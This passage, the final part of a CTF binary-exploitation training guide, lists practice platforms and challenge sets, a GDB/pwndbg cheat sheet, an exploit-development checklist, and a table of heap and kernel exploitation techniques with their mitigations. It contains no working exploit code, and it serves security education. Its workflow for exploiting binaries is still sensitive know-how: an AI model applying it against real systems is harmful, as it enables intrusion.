| **ROP Emporium** | Intermediate | ROP mastery, focused challenges |
| **how2heap** | Intermediate | glibc heap techniques with working examples |
| **pwn.college** | Beginner-Advanced | Academic, very structured |
| **CTFtime Archives** | All levels | Past challenges from real CTFs |

### 6.3 Must-Do Challenge Sets

**If you only do these, you'll be competitive:**

1. **ROP Emporium** — All challenges (ret2win → ret2csu → full ROP)
2. **pwnable.kr** — At least 15 challenges
3. **pwnable.tw** — start, orw, heap, bookshop, 3x17, applestore, hacknote, album, death note, spell
4. **how2heap** — All techniques in the repo (read the code, apply it)
5. **DEF CON Quals 2018-2024** — The pwn challenges
6. **HITCON CTF 2018-2024** — The pwn and kernel challenges

**Writeups to study deeply:**
- DEF CON CTF Quals writeups by PPP, Dragon Sector, Samurai
- hxp CTF writeups (excellent explanations)
- HITCON CTF writeups (cutting-edge kernel and heap)
- Balsn CTF writeups (creative challenges)

### 6.4 How to Do Effective Writeup Study

```
1. Read the challenge description
2. Download the files
3. Attempt to solve (give it 1-2 hours minimum)
4. If stuck, read ONLY the first paragraph of the writeup (the vulnerability identification)
5. Try again with that hint
6. If still stuck, read the next section (the exploit strategy)
7. Continue this pattern until you solve it
8. Write the exploit yourself — don't copy-paste
9. Annotate your exploit with explanations
10. Add the technique to your knowledge base
```

### 6.5 Sparring Practice: Solving and Creating

**Solving other people's challenges builds skill. Creating challenges builds understanding.**

To create a challenge:
1. Pick a technique (e.g., tcache poisoning with safe-linking bypass)
2. Write a small kernel module or userspace program that has that vulnerability
3. Add appropriate protections (but not so many it's unsolvable)
4. Write the intended solution
5. Have a teammate try to solve it

This is incredibly effective because:
- You learn what makes exploitation hard (which teaches you defense)
- You understand the vulnerability deeply (why it exists, how it manifests)
- You practice the full lifecycle (vulnerability → trigger → exploit → flag)

---

## Appendix A: GDB/pwndbg Cheat Sheet

```gdb
# === pwndbg essentials ===
checksec                   # Binary protections
vmmap                      # Memory layout
context                    # Full display (regs + asm + stack)
telescope $rsp 30          # Stack telescope
hexdump <addr> <n>        # Hex dump memory

# === Breakpoints ===
b *0x400000                # Address breakpoint
b *main+0x50               # Offset breakpoint
b *0x400000 if $rdi==0x60  # Conditional breakpoint
delete                      # Delete all breakpoints

# === Stepping ===
si                          # Step instruction
ni                          # Next instruction
fin                         # Finish function
c                           # Continue

# === Examination ===
x/40gx $rsp                # 40 giant-words at stack
x/s <addr>                 # String at address
x/10i $rip                 # 10 instructions
info registers              # Register state
info threads                # Thread info

# === Heap (pwndbg) ===
heap                        # Heap overview
bins                        # Bin overview
tcache                      # Tcache entries
chunk <addr>                # Chunk details
fastbins                    # Fastbin lists
largebins                   # Large bin lists

# === pwntools GDB scripting ===
# In exploit script:
gdb.attach(io, '''
    b *(&_Z3foov)
    c
''')
```

## Appendix B: Exploitation Checklist

``PRE-EXPLOITATION``
[ ] Run `file` on the binary
[ ] Run `checksec`
[ ] Determine architecture and bit width
[ ] Check if stripped or has symbols
[ ] Check libc version (local vs remote)
[ ] Run `strings` for quick wins
[ ] Run `seccomp-tools dump` for sandbox
[ ] Test basic interactions (input/output/format strings)

``STATIC ANALYSIS``
[ ] Open in Ghidra, let auto-analysis run
[ ] Identify main(), input handling functions
[ ] Trace all user input paths
[ ] Identify buffer sizes and bounds checks
[ ] Look for unsafe functions (gets, sprintf, strcpy, printf with user format)
[ ] Map heap operations if heap challenge
[ ] Look for win() or backdoor functions

``DYNAMIC ANALYSIS``
[ ] Run binary, observe behavior
[ ] Attach GDB, set breakpoints at input handling
[ ] Test with long input (crash?)
[ ] Test with format strings (leak?)
[ ] Test with negative numbers (integer wrap?)
[ ] Test with race conditions (double trigger?)

``EXPLOIT DEVELOPMENT``
[ ] Determine vulnerability class
[ ] Calculate offsets (cyclic pattern or manual)
[ ] Determine exploit strategy (see decision tree)
[ ] Write pwntools exploit
[ ] Test locally
[ ] Test with GDB attached
[ ] Test remotely
[ ] Stabilize if unreliable

``POST-EXPLOITATION``
[ ] Get shell
[ ] Find flag (multiple locations)
[ ] Submit flag
[ ] Clean up exploit for future reference
[ ] Add technique to knowledge base
```

## Appendix C: Quick Reference — Common Exploit Techniques

| Technique | Prerequisites | Mitigation |
|-----------|--------------|------------|
| ret2win | Buffer overflow, known address, no canary | Canary, PIE |
| ret2libc | Buffer overflow, libc leak | Full RELRO + ASLR + Canary |
| ret2plt | Buffer overflow, no PIE | PIE |
| ret2csu | Buffer overflow, 64-bit, no PIE | PIE |
| ROP | Buffer overflow, gadgets available | Full RELRO (if overwriting GOT) |
| Format string | `printf(user_input)` | Format string mitigations |
| tcache poisoning | UAF or overflow into tcache, glibc 2.26+ | Safe-linking (glibc 2.32+) |
| fastbin dup | Double free or overflow into fastbin, glibc < 2.26 | tcache (glibc 2.26+), size validation |
| House of Orange | Heap overflow, no UAF, glibc < 2.26 | Various hardening |
| House of Apple | Large bin attack + FSOP, glibc 2.35+ | Still works on recent glibc |
| modprobe_path | Arbitrary kernel write | `CONFIG_STATIC_USERMODEHELPER` |
| cred overwrite | Arbitrary kernel write to current task's cred | Various hardening |

## References

1. [CTFtime — Global CTF Tracker](https://ctftime.org/) — CTF event calendar, ratings, and writeup archive
2. [CTF Wiki](https://ctf-wiki.org/) — Comprehensive CTF technique reference (pwn, web, crypto, reverse)
3. [Pwntools Documentation](https://docs.pwntools.com/) — Python exploit development framework
4. [pwndbg — GDB Exploit Plugin](https://github.com/pwndbg/pwndbg) — Enhanced GDB for CTF and exploit development
5. [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) — Automated ROP gadget search and chain generation
6. [One Gadget — glibc execve Solver](https://github.com/david942j/one_gadget) — Find single-gadget execve RCE offsets
7. [Libc Database](https://github.com/niklasb/libc-database) — Identify glibc version from leaked addresses
8. [How2Heap — Shellphish](https://github.com/shellphish/how2heap) — Progressive heap exploitation tutorials
9. [pwntools — Shellcraft](https://docs.pwntools.com/en/stable/shellcraft/) — Shellcode and template generation
10. [LiveOverflow — Binary Exploitation YouTube](https://www.youtube.com/c/LiveOverflow) — Video CTF training and binary exploitation walkthroughs
11. [Pwn College](https://pwn.college/) — Interactive binary exploitation training platform

---

*This guide is a living document. Update it with every CTF you play. Every technique you learn. Every mistake you make. That's how champions are built — one writeup, one exploit, one flag at a time.*